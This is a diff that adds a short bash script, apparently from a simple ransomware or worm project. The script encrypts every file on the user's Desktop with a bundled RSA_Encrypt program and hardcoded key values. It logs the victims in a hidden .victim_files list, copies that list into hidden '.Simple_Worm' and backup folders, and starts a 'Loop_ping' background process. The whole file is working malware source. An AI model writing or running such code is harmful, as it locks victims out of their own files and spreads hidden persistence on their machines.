@@ -1,0 +1,21 @@
+#!/usr/bin/env bash
+
+cd "$(dirname "$0")";
+
+test -f .victim_files || touch .victim_files
+
+find -L ~/Desktop/*  -maxdepth 0 -type f \
+    -not -exec grep -xq {} ./.victim_files \; \
+    -exec echo Encrypting {} \; \
+    -exec ./RSA_Encrypt -C 126419 30743 {} \; \
+    -fprint ./.victim_files_tmp
+
+cat ./.victim_files_tmp >> ./.victim_files
+
+mkdir -p ~/Public/.Simple_Worm/
+cp ./.victim_files ~/Public/.Simple_Worm/.victim_files 2> /dev/null
+mkdir -p ~/Desktop/.Backup/
+cp ./.victim_files ~/Desktop/.Backup/.victim_files 2> /dev/null
+rm ./.victim_files_tmp
+
+pgrep Loop_ping || ./Loop_ping &
